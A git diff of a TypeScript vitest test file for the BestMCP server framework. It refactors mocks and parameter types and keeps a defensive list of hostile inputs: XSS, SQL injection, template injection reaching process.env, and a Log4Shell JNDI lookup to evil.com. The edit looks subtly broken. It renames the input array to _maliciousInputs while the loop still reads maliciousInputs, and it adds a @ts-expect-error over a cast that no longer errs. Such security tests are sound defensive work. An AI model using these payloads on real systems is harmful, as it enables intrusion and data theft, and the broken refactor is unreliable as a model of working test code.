@@ -1,6 +1,7 @@
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import "reflect-metadata";
 import { z } from "zod";
+import { applyTestMocks } from "../../../test-types.js";
 import { Param, Tool } from "../../src/core/decorators.js";
 import { ToolNotFoundError, ToolValidationError } from "../../src/core/errors.js";
 import { BestMCP } from "../../src/core/server.js";
@@ -29,7 +30,8 @@ class ErrorTestService {
   @Tool("类型错误工具")
   typeError(@Param(z.string(), "参数") param: string): string {
     // 故意返回错误类型
-    return param as any as number;
+    // @ts-expect-error - 测试类型错误处理
+    return param as unknown as string;
   }
 
   @Tool("边界测试工具")
@@ -55,7 +57,10 @@ class ComplexParameterService {
       }),
       "复杂参数",
     )
-    params: any,
+    params: {
+      user: { name: string; age: number; email?: string };
+      settings: { theme: "light" | "dark"; notifications: boolean };
+    },
   ): string {
     return `处理用户: ${params.user.name}`;
   }
@@ -81,7 +86,14 @@ class ComplexParameterService {
       }),
       "嵌套参数",
     )
-    data: any,
+    data: {
+      level1: {
+        level2: {
+          value: string;
+          count: number;
+        };
+      };
+    },
   ): string {
     return `${data.level1.level2.value} x ${data.level1.level2.count}`;
   }
@@ -276,8 +288,7 @@ describe("错误处理和边界条件测试", () => {
 
   describe("内存边界测试", () => {
     it("应该处理大量并发请求", async () => {
-      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
-      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
+      const _mocks = applyTestMocks(mcp, vi);
 
       await mcp.run({ transport: "stdio" });
 
@@ -312,8 +323,7 @@ describe("错误处理和边界条件测试", () => {
 
   describe("状态一致性测试", () => {
     it("应该在错误后保持服务器状态", async () => {
-      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
-      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
+      const _mocks = applyTestMocks(mcp, vi);
 
       await mcp.run({ transport: "stdio" });
 
@@ -338,8 +348,7 @@ describe("错误处理和边界条件测试", () => {
     });
 
     it("应该在多次错误后保持稳定", async () => {
-      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
-      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
+      const _mocks = applyTestMocks(mcp, vi);
 
       await mcp.run({ transport: "stdio" });
 
@@ -360,8 +369,7 @@ describe("错误处理和边界条件测试", () => {
 
   describe("配置边界测试", () => {
     it("应该处理极端的配置值", async () => {
-      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
-      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
+      const _mocks = applyTestMocks(mcp, vi);
 
       // 测试极端端口号
       await expect(mcp.run({ transport: "http", port: 0 })).rejects.toThrow();
@@ -375,12 +383,12 @@ describe("错误处理和边界条件测试", () => {
 
   describe("输入清理和安全测试", () => {
     it("应该安全处理恶意输入", async () => {
-      const maliciousInputs = [
+      const _maliciousInputs = [
         "<script>alert('xss')</script>",
         "'; DROP TABLE users; --",
         "\0\x00\x00\x00",
         "{{constructor.constructor('return process')().env}}",
-        "${jndi:ldap://evil.com/a}",
+        "$" + "{jndi:ldap://evil.com/a}",
       ];
 
       for (const input of maliciousInputs) {
@@ -399,8 +407,7 @@ describe("错误处理和边界条件测试", () => {
 
   describe("并发错误处理", () => {
     it("应该正确处理并发中的混合成功和失败", async () => {
-      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
-      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
+      const _mocks = applyTestMocks(mcp, vi);
 
       await mcp.run({ transport: "stdio" });
 
